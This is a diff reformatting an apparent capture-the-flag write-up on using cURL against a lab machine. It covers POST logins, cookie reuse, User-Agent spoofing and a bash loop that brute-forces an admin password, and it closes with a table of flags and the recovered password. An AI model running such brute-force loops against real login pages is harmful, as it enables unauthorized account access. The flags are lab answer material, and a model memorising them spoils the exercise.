@@ -36,14 +36,20 @@ cURL is a command-line tool for HTTP requests. It allows sending `GET` and `POST
 curl http://MACHINE_IP/
 POST request example:
 ```
+```
+
 bash
 Copy code
 curl -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
+```
+
 View headers and cookies:
+```
 
 bash
 Copy code
 curl -i -X POST -d "username=user&password=user" http://MACHINE_IP/post.php
+```
 
 Task 2 – Web Hacking Using cURL
 1️⃣ Handling Sessions
@@ -51,12 +57,20 @@ Save cookies to a file:
 
 bash
 Copy code
+```
+
 curl -c cookies.txt -d "username=admin&password=admin" http://MACHINE_IP/session.php
+```
+
 Reuse cookies:
 
 bash
 Copy code
+```
+
 curl -b cookies.txt http://MACHINE_IP/session.php
+```
+
 This simulates browser session handling.
 
 
@@ -74,6 +88,8 @@ Create loop.sh:
 
 bash
 Copy code
+```
+
 for pass in $(cat passwords.txt); do
   echo "Trying password: $pass"
   response=$(curl -s -X POST -d "username=admin&password=$pass" http://MACHINE_IP/bruteforce.php)
@@ -81,13 +97,19 @@ for pass in $(cat passwords.txt); do
     echo "[+] Password found: $pass"
     break
   fi
+```
+
 done
 Run script:
 
 bash
 Copy code
+```
+
 chmod +x loop.sh
 ./loop.sh
+```
+
 ✅ Admin password found: secretpass
 
 
@@ -98,16 +120,25 @@ Spoof User-Agent using -A:
 
 bash
 Copy code
-curl -A "TBFC" http://MACHINE_IP/agent.php
-Flag received: THM{user_agent_filter_bypassed}
+```
 
+curl -A "TBFC" http://MACHINE_IP/agent.php
+```
+answer:
+```
+
+Flag received: THM{user_agent_filter_bypassed}
+```
 
 ✅ Flags & Answers
-Task	Endpoint	Action	Flag
-POST login	/post.php	username=admin, password=admin	THM{curl_post_success}
-Session	/cookie.php	Save & reuse cookie	THM{session_cookie_master}
-Brute-force	/bruteforce.php	Admin password	secretpass
-User-Agent	/agent.php	Spoofed User-Agent	THM{user_agent_filter_bypassed}
+
+| Task        | Endpoint          | Action                      | Flag                           |
+|------------|-----------------|----------------------------|--------------------------------|
+| POST login  | /post.php        | username=admin, password=admin | THM{curl_post_success}        |
+| Session     | /cookie.php      | Save & reuse cookie         | THM{session_cookie_master}    |
+| Brute-force | /bruteforce.php  | Admin password              | secretpass                    |
+| User-Agent  | /agent.php       | Spoofed User-Agent          | THM{user_agent_filter_bypassed} |
+
 
 Bonus Mission – Final Operation
 Endpoint: /terminal.php?action=panel
